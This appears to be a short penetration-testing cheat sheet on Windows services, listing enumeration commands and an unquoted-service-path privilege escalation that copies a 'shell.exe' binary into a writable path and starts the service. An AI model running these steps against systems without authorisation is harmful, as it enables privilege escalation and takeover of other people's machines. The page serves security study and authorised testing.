# Services

## General Commands

```bash
# WinPEAS Service info
winPEASany.exe quiet servicesinfo
# Get list of services
net start
# Get list of services
wmic service list brief
# Get list of services
sc query
# Get list of services (PowerShell)
services
# Get list of services (PowerShell)
Get-Service
# Check service permissions
sc qc %servicename%
# Check rights for different groups
accesschk.exe  /accepteula -ucqv %servicename%
```

## Unquoted Service Paths

{% code overflow="wrap" %}
```powershell
# List unquoted service paths without tools
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """
# Confirm permissions with accesschk.exe
.\accesschk.exe /accepteula -ucqv user %servicename%
# Use accesschk to find writeable permissions in binary path
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
# Copy shell to path
copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
# Start the service 
net start %servicename%
```
{% endcode %}
